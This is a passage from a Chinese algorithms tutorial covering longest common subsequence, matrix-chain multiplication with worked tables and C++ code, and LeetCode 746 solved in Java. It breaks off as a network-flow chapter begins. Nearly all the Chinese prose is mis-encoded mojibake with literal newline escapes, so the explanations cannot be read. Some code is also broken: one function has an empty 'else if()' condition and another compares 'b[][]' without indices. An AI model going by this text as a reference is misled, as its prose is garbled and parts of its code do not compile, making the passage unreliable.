x<sub>2</sub>, â€¦, x<sub>i</sub>}** å’Œ **Y<sub>j</sub>={y<sub>1</sub>, y<sub>2</sub>, â€¦, y<sub>j</sub>}** çš„æœ€é•¿å…¬å…±å­åºåˆ—çš„é•¿åº¦ï¼Œé‚£ä¹ˆå¾—åˆ°ä»¥ä¸‹çš„é€’æ¨å…¬å¼ï¼š\n\n![](https://img.jwt1399.top//img/20211010182558.png)\n\n**é€’æ¨å…¬å¼ä»£ç ç‰ˆ**ï¼š\n\n```c\nfor(int i = 0; i <= n; i++){\n\t\tfor(int j = 0; j <= m; j++){\n\t\t\tc[i][0] = 0;\n\t\t\tc[0][j] = 0;\n\t\t}\n    }\nfor(int i = 1; i <= n; i++)\n    for(int j = 1; j <= m; j++){\n        if(X[i] == Y[j]){\n            c[i][j] = c[i-1][j-1] + 1;\n        }\n        else{\n            c[i][j] = max(c[i - 1][j], c[i][j - 1]);\n        } \t\n    }\n```\n\n**3ã€è®¡ç®—`æœ€ä¼˜å€¼`**\n\n> å‡è®¾ X={A,B,C,E} å’Œ Y={B,D,C,E}\n\næ ¹æ®ä¸Šæ–¹é€’æ¨å…¬å¼å¾—åˆ°ä¸‹è¡¨ï¼š\n\n| `c[i][j]` | 0    | 1B   | 2D   | 3C   | 4E   |\n| --------- | ---- | ---- | ---- | ---- | ---- |\n| **0**     | 0    | 0    | 0    | 0    | 0    |\n| **1A**    | 0    | 0    | 0    | 0    | 0    |\n| **2B**    | 0    | 1    | 1    | 1    | 1    |\n| **3C**    | 0    | 1    | 1    | 2    | 2    |\n| **4E**    | 0    | 1    | 1    | 2    | `3`  |\n\nåœ¨ `C[2][0]` å¤„ï¼Œj = 0 ï¼Œæ­¤æ—¶æ ¹æ®å…¬å¼`C[2][0]= 0`\n\nåœ¨ `C[2][1]` å¤„ï¼ŒB = Bï¼Œå³ **x<sub>i</sub>=y<sub>j</sub>** ï¼Œæ­¤æ—¶æ ¹æ®å…¬å¼`C[2][1]=C[1][0]+1=0+1=1`\n\nåœ¨ `C[2][2]` å¤„ï¼ŒB â‰  Cï¼Œå³ **x<sub>i</sub>â‰ y<sub>j</sub>** ï¼Œæ­¤æ—¶æ ¹æ®å…¬å¼`C[2][2]=max{C[2][1],C[1][2]}=1`\n\næ ¹æ®æœ€**å³ä¸‹è§’çš„å€¼(c[][])**ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“**æœ€é•¿å…¬å…±å­åºåˆ—é•¿åº¦ä¸º3**ã€‚\n\n**æœ€ä¼˜å€¼ä»£ç ç‰ˆï¼š**\n\n```c\nint LCSLength(char *X,char *Y)\n{\n\tfor(int i = 0; i <= n; i++){\n\t\tfor(int j = 0; j <= m; j++){\n\t\t\tc[i][0] = 0;\n\t\t\tc[0][j] = 0;\n\t\t}\n    }\n\tfor(int i = 1; i <= n; i++)\n\t\tfor(int j = 1; j <= m; j++){\n\t\t\tif(X[i] == Y[j]){\n\t\t\t\tc[i][j] = c[i-1][j-1] + 1;\n\t\t\t}\n\t\t\telse{\n\t\t\t\tc[i][j] = max(c[i - 1][j], c[i][j - 1]);\n\t\t\t} \t\n\t\t}\n     return c[n][m];\n}\n```\n\n**4ã€æ„é€ `æœ€ä¼˜è§£`**\n\n`b[i][j]`è®°å½•`c[i][j]`çš„å€¼æ˜¯ç”±å“ªä¸ªå­é—®é¢˜çš„è§£å¾—åˆ°çš„\n\n- `if(X[i]==Y[j])` ç”¨b=1ä»£è¡¨\n\n- `if(X[i]!=Y[j])` ç”¨b=2ä»£è¡¨\n\n| `b[i][j]` | 0    | 1B   | 2D   | 3C   | 4E   |\n| --------- | ---- | ---- | ---- | ---- | ---- |\n| **0**     | 0    | 0    | 0    | 0    | 0    |\n| **1A**    | 0    | 2    | 2    | 2    | 2    |\n| **2B**    | 0    | 1    | 2    | 2    | 2    |\n| **3C**    | 0    | 2    | 2    | 1    | 2    |\n| **4E**    | 0    | 2    | 2    | 2    | 1    |\n\n\n\n| `c[i][j]` | 0    | 1B   | 2D   | 3C   | 4E   |\n| --------- | ---- | ---- | ---- | ---- | ---- |\n| **0**     | 0    | 0    | 0    | 0    | 0    |\n| **1A**    | 0    | 0    | 0    | 0    | 0    |\n| **2B**    | 0    | 1`â†–` | 1`â†` | 1    | 1    |\n| **3C**    | 0    | 1    | 1    | 2`â†–` | 2    |\n| **4E**    | 0    | 1    | 1    | 2    | 3`â†–` |\n\n`â†–`å¤„åˆ™ä¸ºæœ€é•¿å…¬å…±å­åºåˆ—{B,C,E}\n\n#### âä»£ç å®ç°\n\n```c\n//è‡ªåº•å‘ä¸Šè®¡ç®—æœ€ä¼˜å€¼ï¼Œå¹¶è®°å½•ç›¸å…³ä¿¡æ¯\nvoid LCSLength(){\n\tint i,j;\n\tfor(i=1; i<=m; i++){\n\t\tc[i][0] = 0;\n\t}\n\tfor(i=1; i<=n;i++){\n\t\tc[0][i] = 0;\n\t}\n\tfor(i=1; i<=m; i++){\n\t\tfor(j=1; j<=n; j++){\n\t\t\tif(x[i] == y[j]){\n\t\t\t\tc[i][j] = c[i-1][j-1] + 1;\n\t\t\t\tb[i][j] = 1;\n\t\t\t}else if(){\n\t\t\t\tc[i][j] = c[i-1][j];\n\t\t\t\tb[i][j] = 3;\n\t\t\t}else{\n\t\t\t\tc[i][j] = c[i][j-1];\n\t\t\t\tb[i][j] = 2;\n\t\t\t}\n\t\t}\n\t}\n}\nvoid LCS(int i,int j,char *x,int **b){\n\tif(i == 0 || j == 0){\n\t\treturn;\n\t}\n\tif(b[i][j] == 1){\n\t\tLCS(i-1,j-1,x,b);\n\t\tcout<<x[i];\n\t}else if(b[][] == 2){\n\t\tLCS(i,j-1,x,b);\n\t}else{\n\t\tLCS(i-1,j,x,b);\n\t}\n}\n```\n\n#### â‚çœŸé¢˜ç»ƒä¹ \n\n##### é¢˜ç›®1\n\nç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²Aå’ŒBï¼Œé•¿åº¦åˆ†åˆ«ä¸ºmå’Œnï¼Œè®¾è®¡åŠ¨æ€è§„åˆ’ç®—æ³•æ‰¾å‡ºå®ƒä»¬æœ€é•¿å…¬å…±å­åºåˆ—é•¿åº¦ï¼Œå¹¶ç»™å‡ºæœ€é•¿å…¬å…±å­åºåˆ—ã€‚ä¾‹å¦‚ï¼šA = \"HelloWorld\"ï¼ŒB = \"loopbird\"ï¼Œåˆ™Aä¸Bçš„æœ€é•¿å…¬å…±å­åºåˆ—ä¸º\"loord\"ï¼Œè¿”å›çš„é•¿åº¦ä¸º5ã€‚\n\n\n\n##### é¢˜ç›®2\n\nè®¾è®¡ä¸€ä¸ª O(n<sup>2</sup>) æ—¶é—´çš„ç®—æ³•ï¼Œæ‰¾å‡ºç”± n ä¸ªæ•°ç»„æˆçš„åºåˆ—çš„æœ€é•¿å•è°ƒé€’å¢å­åºåˆ—(LIS)ã€‚\n\nè§£æ³•ä¸€ï¼šè½¬åŒ–æˆ LCS é—®é¢˜æ±‚è§£ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(n*n).\n\næ€è·¯ï¼šåŸåºåˆ—ä¸º Aï¼ŒæŠŠ A æŒ‰å‡åºæ’åºå¾—åˆ°åºåˆ— Bï¼Œæ±‚å‡º Aï¼ŒB åºåˆ—çš„æœ€é•¿å…¬å…±å­åºåˆ—ï¼Œå³ä¸º A çš„æœ€é•¿å•è°ƒé€’å¢å­åºåˆ—ã€‚\n\nè§£æ³•äºŒï¼šè®¾ d[i] ä¸ºä»¥ç¬¬ i ä¸ªå…ƒç´ ç»“å°¾çš„æœ€é•¿é€’å¢å­åºåˆ—çš„é•¿åº¦ï¼Œ\n\nåˆ™ d(i) = max(d(j)) + 1; ( j<i && a[j] < a[i] ) ,  æ—¶é—´å¤æ‚åº¦O(n*n)\n\n### âºçŸ©é˜µè¿ä¹˜\n\n##### â€ç†è®ºåˆ†æ\n\n> **é—®é¢˜æè¿°ï¼š**ç»™å®š n ä¸ªçŸ©é˜µ {A<sub>1</sub>,A<sub>2</sub>,â€¦,A<sub>n</sub>} ï¼Œå…¶ä¸­ A<sub>i</sub> ä¸ A<sub>i+1</sub> æ˜¯å¯ä¹˜çš„ï¼Œç”¨åŠ æ‹¬å·çš„æ–¹æ³•è¡¨ç¤ºçŸ©é˜µè¿ä¹˜çš„æ¬¡åºï¼Œä¸åŒåŠ æ‹¬å·çš„æ–¹æ³•æ‰€å¯¹åº”çš„è®¡ç®—æ¬¡åºæ˜¯ä¸åŒçš„ï¼Œæ±‚çŸ©é˜µè¿ä¹˜çš„æœ€ä½³è®¡ç®—æ¬¡åºã€‚\n>\n> ä¾‹å¦‚ï¼ŒçŸ©é˜µè¿ä¹˜ç§¯ A<sub>1</sub>A<sub>2</sub>A<sub>3</sub> æœ‰ä»¥ä¸‹ 2 ç§åŠ æ‹¬å·æ–¹å¼ï¼šA<sub>1</sub>(A<sub>2</sub>A<sub>3</sub>)ï¼Œ(A<sub>1</sub>A<sub>2</sub>)A<sub>3</sub>ï¼Œæ‰€ä»¥é‚£ç§åŠ æ‹¬å·æ–¹å¼æ˜¯æœ€ä¼˜çš„å‘¢ï¼Ÿ\n>\n> è¯´æ˜ï¼š\n>\n> - 1.çŸ©é˜µ A å’ŒçŸ©é˜µ B å¯ä¹˜çš„æ¡ä»¶ï¼š`çŸ©é˜µ A çš„åˆ—æ•° = çŸ©é˜µ B çš„è¡Œæ•°`\n> - 2.è®¾çŸ©é˜µ A æ˜¯ p Ã— q çš„çŸ©é˜µï¼ŒB æ˜¯ q Ã— r çš„çŸ©é˜µï¼Œ`ä¹˜ç§¯ç»“æœ C æ˜¯ p Ã— rçš„çŸ©é˜µï¼Œè®¡ç®—é‡æ˜¯ p * q * r`\n\n**1ã€åˆ†ææœ€ä¼˜å­ç»“æ„**\n\nå°†çŸ©é˜µè¿ä¹˜çš„ç§¯ **A<sub>i</sub> A<sub>i+1</sub> â€¦ A<sub>j</sub>** ç®€è®°ä¸º`A[i][j]` ï¼Œ**A<sub>i</sub>** çš„ç»´åº¦è®°ä¸º **p<sub>i-1Â </sub>Ã— p<sub>i</sub>**ï¼Œé‚£ä¹ˆä¸Šè¿°é—®é¢˜å˜ä¸ºæ±‚è§£ `A[1][n]`çš„æœ€ä½³è®¡ç®—æ¬¡åºã€‚\n\n`A[1][n]çš„æœ€ä½³è®¡ç®—æ¬¡åºï¼š`è®¾è¿™ä¸ªè®¡ç®—æ¬¡åºåœ¨çŸ©é˜µ  A<sub>KÂ </sub> (1â‰¤k<n) å’Œ A<sub>K+1</sub> ä¹‹é—´å°†çŸ©é˜µé“¾æ–­å¼€ï¼Œåˆ™ç›¸åº”çš„åŠ æ‹¬å·æ–¹å¼ï¼š( **A<sub>i</sub> A<sub>i+1</sub> â€¦ A<sub>k</sub>** )( **A<sub>k+1</sub>A<sub>i+1</sub> â€¦ A<sub>n</sub>** )ï¼Œä¾æ­¤è®¡ç®—é¡ºåºï¼Œæ€»è®¡ç®—é‡ä¸º **A<sub>i</sub> A<sub>i+1</sub> â€¦ A<sub>k</sub>** çš„è®¡ç®—é‡åŠ ä¸Š **A<sub>k+1</sub>A<sub>i+1</sub> â€¦ A<sub>n</sub>** çš„è®¡ç®—é‡ï¼Œå†åŠ ä¸Š ( **A<sub>i</sub> A<sub>i+1</sub> â€¦ A<sub>k</sub>** ) å’Œ  ( **A<sub>k+1</sub>A<sub>i+1</sub> â€¦ A<sub>n</sub>** )ç›¸ä¹˜çš„è®¡ç®—é‡ã€‚å³ **A[1]\\[n] = A[1]\\[k] + A[k+1]\\[n] + p<sub>i-1</sub>p<sub>k</sub>p<sub>n</sub>** \n\n**2ã€å»ºç«‹é€’æ¨å…¬å¼**\n\nè®¾è®¡ç®— `A[i][j]` (iâ‰¤j) æ‰€éœ€çš„æœ€å°‘ä¹˜æ³•æ¬¡æ•°ä¸º `m[i][j]`ï¼Œé‚£ä¹ˆå¾—åˆ°ä»¥ä¸‹çš„é€’æ¨å…¬å¼ï¼š\n\n![](https://img.jwt1399.top//img/20211011125331.png)\n\n**3ã€è®¡ç®—`æœ€ä¼˜å€¼`**\n\nä¾‹å¦‚ï¼Œè¦è®¡ç®—çŸ©é˜µè¿ä¹˜ç§¯A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>A<sub>6</sub>ï¼Œå…¶ä¸­å„çŸ©é˜µçš„ç»´æ•°åˆ†åˆ«ä¸º:\n\n| A1    | A2    | A3   | A4   | A5    | A6    |\n| ----- | ----- | ---- | ---- | ----- | ----- |\n| 30x35 | 35x15 | 15x5 | 5x10 | 10x20 | 20x25 |\n\nä¾æ®é€’æ¨å…¬å¼ï¼ŒæŒ‰ç…§å›¾ a çš„æ¬¡åºï¼Œè®¡ç®—å‡º  `m[i][j]`\n\n![](https://img.jwt1399.top/img/image-20211011130742451.png)\n\n![](https://img.jwt1399.top//img/20211011131609.png)\n\nâ˜…æœ€ä¼˜å€¼ï¼šæœ¬é¢˜æ˜¯æ±‚è§£ `A[1][6]` çš„æœ€ä½³è®¡ç®—æ¬¡åºï¼Œå³æ±‚`m[1][6]` ã€‚ç”±å›¾ b å¯çŸ¥ï¼Œ `m[1][6] =15125`ï¼Œå› æ­¤çŸ©é˜µè¿ä¹˜ç§¯A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>A<sub>6</sub> çš„æœ€ä¼˜å€¼ä¸º **15125**\n\n**4ã€æ„é€ `æœ€ä¼˜è§£`**\n\nè‹¥å°†å¯¹åº”`m[i][j]`çš„æ–­å¼€ä½ç½®`k`è®°ä¸º`s[i][j]`ï¼Œè®¡ç®—å‡ºæœ€ä¼˜å€¼`m[i][j]`åï¼Œå¯é€’å½’åœ°ç”±`s[i][j]`[][]æ„é€ å‡ºç›¸åº”çš„æœ€ä¼˜è§£ã€‚\n\n![](https://img.jwt1399.top//img/20211011131648.png)\n\nä¾‹å¦‚ï¼Œ**m[2]\\[5] = m[2]\\[3] + m[4]\\[5] + p<sub>1</sub>p<sub>3</sub>p<sub>5</sub>** ï¼Œåˆ™ k = 3ï¼Œå› æ­¤ **s[2]\\[5] = 3**\n\nâ˜…æœ€ä¼˜è§£ï¼š\n\ns[1]\\[6] = 3 ,å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>3</sub>å’ŒA<sub>4</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **(A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>)(A<sub>4</sub>A<sub>5</sub>A<sub>6</sub> )**\n\ns[1]\\[3] = 1,å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>1</sub>å’ŒA<sub>2</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **(A<sub>1</sub>(A<sub>2</sub>A<sub>3</sub>))(A<sub>4</sub>A<sub>5</sub>A<sub>6</sub> )**\n\ns[4]\\[6] = 5,å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>5</sub>å’ŒA<sub>6</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **(A<sub>1</sub>(A<sub>2</sub>A<sub>3</sub>))((A<sub>4</sub>A<sub>5</sub>)A<sub>6</sub> )**\n\nå› æ­¤æœ€ä¼˜è§£ä¸º **(A<sub>1</sub>(A<sub>2</sub>A<sub>3</sub>))((A<sub>4</sub>A<sub>5</sub>)A<sub>6</sub> )**\n\n##### âä»£ç å®ç°\n\n```c\n#include <iostream>\nusing namespace std;\n#define N 100\nint s[N][N], m[N][N];  //så­˜å‚¨åˆ‡å‰²ä½ç½®ï¼Œmå­˜å‚¨æœ€ä¼˜å€¼ \n\nvoid MatricChain(int *p , int n) {//pçŸ©é˜µç»´æ•°æ•°ç»„ï¼Œnä¸ºçŸ©é˜µä¸ªæ•°\n\tfor (int i = 1; i <= n; i++) {//åˆå§‹åŒ–ï¼Œå¯¹è§’çº¿ä¸Šçš„è®¡ç®—é‡å’ŒåŠ æ‹¬å·çš„ä½ç½®ä¸º0\n\t\tm[i][i] = 0;\n\t\ts[i][i] = 0;\n\t}\n\tfor (int r = 2; r <= n; r++) {//rä¸ºçŸ©é˜µé“¾çš„é•¿åº¦\n\t\tfor (int i = 1; i <= n - r + 1; i++) { //iä¸ºé¦–çŸ©é˜µçš„åºå·\n\t\t\tint j = i + r - 1; //jä¸ºå°¾çŸ©é˜µçš„åºå·\n\t\t\tm[i][j] = m[i][i] + m[i + 1][j] + p[i - 1] * p[i] * p[j];//é¦–å…ˆå°è¯•åœ¨çŸ©é˜µ i å¤„åˆ†å¼€\n\t\t\ts[i][j] = i;\n\t\t\tfor (int k = i + 1; k < j; k++) {  \n\t\t\t\t\tint t = m[i][k] + m[k + 1][j] + p[i - 1] * p[k] * p[j]; // ç„¶åå°è¯•åœ¨çŸ©é˜µ k å¤„åˆ†å¼€ (i<=k<j)\n\t\t\t\t\tif (t < m[i][j]) {\n\t\t\t\t\t\tm[i][j] = t;\n\t\t\t\t\t\ts[i][j] = k;\n\t\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\nvoid Traceback(int i, int j) {\n\tif (i == j) {\n\t\treturn;\n\t}\n\tint k = s[i][j];\n\tTraceback(i, k); \n\tTraceback(k + 1, j);\n\tcout << \"A\" << \"[\" << i << \":\" << k << \"]\" << \"Ã—\" << \"A\"\"[\" << (k + 1) << \":\" << j << \"]\"<<\"  \" ;\n}\n\nint main(){\n\tint p[] = {30,35,15,5,10,20,25};//çŸ©é˜µç»´æ•°\n\tint n = sizeof(p) / sizeof(int) - 1;//çŸ©é˜µä¸ªæ•°\n\n\tfor(int i = 0; i < n; i++){\n\t\tcout << p[i]<<\"Ã—\"<<p[i+1]<<\"  \";\n\t}\n\tcout << \"è¿™\" << n << \"ä¸ªçŸ©é˜µè¿ä¹˜çš„æœ€ä¼˜å€¼å’Œæœ€ä¼˜è§£ï¼Ÿ\" << endl;\n\tcout << endl;\n\n\tMatricChain(p,n);\n\tcout << \"m[i][j]:\" << endl;\n\tfor (int i = 1; i <= n; i++) {\n\t\tfor (int j = 1; j <= n; j++)\n\t\t\tcout << m[i][j] << \"\\t\";\n\t\tcout << endl;\n\t}\n\n\tcout << endl;\n\tcout << \"s[i][j]:\" << endl;\n\tfor (int i = 1; i <= n; i++) {\n\t\tfor (int j = 1; j <= n; j++)\n\t\t\tcout << s[i][j] << \"\\t\";\n\t\tcout << endl;\n\t}\n\tcout << endl;\n\tcout << \"æœ€å°‘è¿ä¹˜æ¬¡æ•°(æœ€ä¼˜å€¼):\" << m[1][n] << \"æ¬¡ã€‚\" << endl;\n\tcout << \"æœ€ä½³è®¡ç®—æ¬¡åº(æœ€ä¼˜è§£):\" ;\n\tTraceback(1, n);\n\tcout << endl;\n}\n```\n\n\n\n![](https://img.jwt1399.top//img/20211011231627.png)\n\n##### â‚çœŸé¢˜ç»ƒä¹ \n\n###### é¢˜ç›®1\n\n![](https://img.jwt1399.top//img/20211011201113.png)\n\nï¼ˆ1ï¼‰ä»¤è®¡ç®—**A<sub>1</sub> x A<sub>2</sub> x A<sub>3</sub> x ... x A<sub>n</sub>**æ‰€éœ€è¦çš„æœ€å°‘ä¹˜æ³•æ¬¡æ•°ä¸º*m*[*i*, *j*] ï¼ˆ3åˆ†ï¼‰\n\nâ€‹\t\t\tåˆ™é€’å½’å…³ç³»å¼ä¸º![](https://img.jwt1399.top//img/20211011201529.png)  ï¼ˆ5åˆ†ï¼Œå…¶ä¸­è¾¹ç•Œæ¡ä»¶1åˆ†)\n\n ï¼ˆ2ï¼‰\n\n| m(*i*, *j*) | *j* = 1 | *j* = 2 | *j* = 3 | *j* = 4 | *j* = 5 |\n| ----------- | ------- | ------- | ------- | ------- | ------- |\n| *i* = 1     | 0       | 1440    | 3360    | 4000    | `5856`  |\n| *i* = 2     | /       | 0       | 2400    | 2800    | 4800    |\n| *i* = 3     | /       | /       | 0       | 1600    | 2880    |\n| *i* = 4     | /       | /       | /       | 0       | 3200    |\n| *i* = 5     | /       | /       | /       | /       | 0       |\n\n å°†å¯¹åº”`m(i,j)`çš„æ–­å¼€ä½ç½®`k`è®°ä¸º`s(i,j)`\n\n| *s*(*i*, *j*) | *j* = 1 | *j* = 2 | *j* = 3 | *j* = 4 | *j* = 5 |\n| ------------- | ------- | ------- | ------- | ------- | ------- |\n| *i* = 1       | /       | 1       | 2       | 2       | `2`     |\n| *i* = 2       | /       | /       | 2       | 2       | 2       |\n| *i* = 3       | /       | /       | /       | 3       | `4`     |\n| *i* = 4       | /       | /       | /       | /       | 4       |\n| *i* = 5       | /       | /       | /       | /       | /       |\n\n s(1,5) = 2 å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>2</sub>å’ŒA<sub>3</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **(A<sub>1</sub>A<sub>2</sub>)(A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>)**\n\ns(3,5) = 4 å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>4</sub>å’ŒA<sub>5</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **(A<sub>1</sub>A<sub>2</sub>)((A<sub>3</sub>A<sub>4</sub>)A<sub>5</sub>)**\n\næœ€ä¼˜åŠ æ‹¬å·æ–¹å¼ä¸º![](https://img.jwt1399.top//img/20211011202017.png)\n\n###### é¢˜ç›®2\n\n| **A1** | **A2** | **A3** | **A4** | **A5** |\n| ------ | ------ | ------ | ------ | ------ |\n| 3x7    | 7x8    | 8x5    | 5x12   | 12x10  |\n\nè®¡ç®—çŸ©é˜µè¿ä¹˜ç§¯A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>æœ€ä¼˜å€¼å’Œæœ€ä¼˜è§£ï¼Ÿ\n\n| m[i]\\[j] | **1** | **2** | **3** | **4** | **5** |\n| -------- | ----- | ----- | ----- | ----- | ----- |\n| **1**    | 0     | 168   | 288   | 468   | `828` |\n| **2**    |       | 0     | 280   | 700   | 1230  |\n| **3**    |       |       | 0     | 480   | 1000  |\n| **4**    |       |       |       | 0     | 600   |\n| **5**    |       |       |       |       | 0     |\n\n| s[i]\\[j] | **1** | **2** | **3** | **4** | **5** |\n| -------- | ----- | ----- | ----- | ----- | ----- |\n| **1**    | 0     | 1     | `2`   | `3`   | `4`   |\n| **2**    |       | 0     | 2     | 3     | 3     |\n| **3**    |       |       | 0     | 3     | 3     |\n| **4**    |       |       |       | 0     | 4     |\n| **5**    |       |       |       |       | 0     |\n\næœ€å°‘ä¹˜æ³•æ¬¡æ•°ä¸º(æœ€ä¼˜å€¼)ï¼š**828**\n\ns[1]\\[5] = 4 å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>4</sub>å’ŒA<sub>5</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **(A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>A<sub>4</sub>)A<sub>5</sub>**\n\ns[1]\\[4] = 3 å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>3</sub>å’ŒA<sub>4</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **((A<sub>1</sub>A<sub>2</sub>A<sub>3</sub>)A<sub>4</sub>)A<sub>5</sub>**\n\ns[1]\\[3] = 2 å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>2</sub>å’ŒA<sub>3</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **(((A<sub>1</sub>A<sub>2</sub>)A<sub>3</sub>)A<sub>4</sub>)A<sub>5</sub>**\n\næœ€ä¼˜åŠ æ‹¬å·æ–¹å¼ä¸º(æœ€ä¼˜è§£)ï¼š **(((A<sub>1</sub>A<sub>2</sub>)A<sub>3</sub>)A<sub>4</sub>)A<sub>5</sub>**\n\n### â»çœŸé¢˜ç»ƒä¹ \n\n#### é¢˜ç›®1\n\n**é¢˜ç›®ï¼š**LC746. ä½¿ç”¨æœ€å°èŠ±è´¹çˆ¬æ¥¼æ¢¯\n\næ•°ç»„çš„æ¯ä¸ªä¸‹æ ‡ä½œä¸ºä¸€ä¸ªé˜¶æ¢¯ï¼Œç¬¬ i ä¸ªé˜¶æ¢¯å¯¹åº”ç€ä¸€ä¸ªéè´Ÿæ•°çš„ä½“åŠ›èŠ±è´¹å€¼ cost[i]ï¼ˆä¸‹æ ‡ä» 0 å¼€å§‹ï¼‰ã€‚æ¯å½“ä½ çˆ¬ä¸Šä¸€ä¸ªé˜¶æ¢¯ä½ éƒ½è¦èŠ±è´¹å¯¹åº”çš„ä½“åŠ›å€¼ï¼Œä¸€æ—¦æ”¯ä»˜äº†ç›¸åº”çš„ä½“åŠ›å€¼ï¼Œä½ å°±å¯ä»¥é€‰æ‹©å‘ä¸Šçˆ¬ä¸€ä¸ªé˜¶æ¢¯æˆ–è€…çˆ¬ä¸¤ä¸ªé˜¶æ¢¯ã€‚è¯·ä½ æ‰¾å‡ºè¾¾åˆ°æ¥¼å±‚é¡¶éƒ¨çš„æœ€ä½èŠ±è´¹ã€‚åœ¨å¼€å§‹æ—¶ï¼Œä½ å¯ä»¥é€‰æ‹©ä»ä¸‹æ ‡ä¸º 0 æˆ– 1 çš„å…ƒç´ ä½œä¸ºåˆå§‹é˜¶æ¢¯ã€‚\n\nç¤ºä¾‹ 1ï¼š\n\n```properties\nè¾“å…¥ï¼šcost = [10, 15, 20]\nè¾“å‡ºï¼š15\nè§£é‡Šï¼šæœ€ä½èŠ±è´¹æ˜¯ä» cost[1] å¼€å§‹ï¼Œç„¶åèµ°ä¸¤æ­¥å³å¯åˆ°é˜¶æ¢¯é¡¶ï¼Œä¸€å…±èŠ±è´¹ 15 ã€‚\n ç¤ºä¾‹ 2ï¼š\n\nè¾“å…¥ï¼šcost = [1, 100, 1, 1, 1, 100, 1, 1, 100, 1]\nè¾“å‡ºï¼š6\nè§£é‡Šï¼šæœ€ä½èŠ±è´¹æ–¹å¼æ˜¯ä» cost[0] å¼€å§‹ï¼Œé€ä¸ªç»è¿‡é‚£äº› 1 ï¼Œè·³è¿‡ cost[3] ï¼Œä¸€å…±èŠ±è´¹ 6 ã€‚\n```\n\n**æ€è·¯**\n\nåˆ›å»ºé•¿åº¦ä¸º n + 1 çš„æ•°ç»„ dpï¼Œå…¶ä¸­ dp[i] è¡¨ç¤ºè¾¾åˆ°ä¸‹æ ‡ i çš„æœ€å°èŠ±è´¹ã€‚\n\nç”±äºå¯ä»¥é€‰æ‹©ä¸‹æ ‡ 0 æˆ– 1 ä½œä¸ºåˆå§‹é˜¶æ¢¯ï¼Œå› æ­¤æœ‰ dp[0] = dp[1] = 0\n\nå½“ 2 â‰¤ i â‰¤ n æ—¶ï¼Œå¯ä»¥ä»ä¸‹æ ‡ iâˆ’1 ä½¿ç”¨ cost[iâˆ’1] çš„èŠ±è´¹è¾¾åˆ°ä¸‹æ ‡ iï¼Œæˆ–è€…ä»ä¸‹æ ‡ iâˆ’2 \n\nä½¿ç”¨ cost[iâˆ’2] çš„èŠ±è´¹è¾¾åˆ°ä¸‹æ ‡ iã€‚ä¸ºäº†ä½¿æ€»èŠ±è´¹æœ€å°ï¼Œdp[i] åº”å–ä¸Šè¿°ä¸¤é¡¹çš„æœ€å°\n\nå€¼ï¼Œå› æ­¤çŠ¶æ€è½¬ç§»æ–¹ç¨‹å¦‚ä¸‹ï¼š\n\n**dp[i]=min(dp[iâˆ’1]+cost[iâˆ’1],dp[iâˆ’2]+cost[iâˆ’2])**\n\nä¾æ¬¡è®¡ç®— dp ä¸­çš„æ¯ä¸€é¡¹çš„å€¼ï¼Œæœ€ç»ˆå¾—åˆ°çš„ dp[n] å³ä¸ºè¾¾åˆ°æ¥¼å±‚é¡¶éƒ¨çš„æœ€å°èŠ±è´¹ã€‚\n\nè§£ç­”\n\n```java\nclass Solution {\n    public int minCostClimbingStairs(int[] cost) {\n        int n = cost.length;\n        int[] dp = new int[n + 1];\n        dp[0] = dp[1] = 0;\n        for (int i = 2; i <= n; i++) {\n            dp[i] = Math.min(dp[i - 1] + cost[i - 1], dp[i - 2] + cost[i - 2]);\n        }\n        return dp[n];\n    }\n}\n```\n\n#### é¢˜ç›®2\n\n![](https://img.jwt1399.top/img/image-20211210154118892.png)\n\n![](https://img.jwt1399.top/img/image-20211210154157032.png)\n\n![](https://img.jwt1399.top/img/image-20211210154316100.png)\n\n##  â‘¥ç½‘ç»œæµ\n\n> **æœ¬ç« é‡ç‚¹ï¼š**\n>\n> - ç†è§£æœ€å¤§æµã€ä»»æ„æµã€æœ€å°å‰²ã€ä»»æ„å‰²ä¹‹é—´çš„å…³ç³»ï¼›\n>\n> - æŒæ¡ç½‘ç»œæœ€å¤§æµé—®é¢˜å’Œæœ€å°å‰²é—®é¢˜åŠå…¶æ±‚è§£ç®—æ³•ï¼Œç»™å‡ºä¸€ä¸ªç½‘ç»œèƒ½æ±‚å‡ºå®ƒçš„æœ€å¤§æµæˆ–è€…æœ€å°å‰²ã€‚\n\n### 